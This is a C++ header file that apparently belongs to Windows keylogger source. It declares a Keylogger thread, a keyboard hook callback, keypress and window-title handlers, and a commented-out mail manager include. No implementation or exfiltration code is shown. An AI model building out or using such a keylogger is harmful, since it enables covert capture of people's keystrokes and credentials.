#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
using namespace std;

DWORD WINAPI Keylogger(LPVOID lpParm);
LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam);
void on_press(string key);
void wintitle();
void FSD();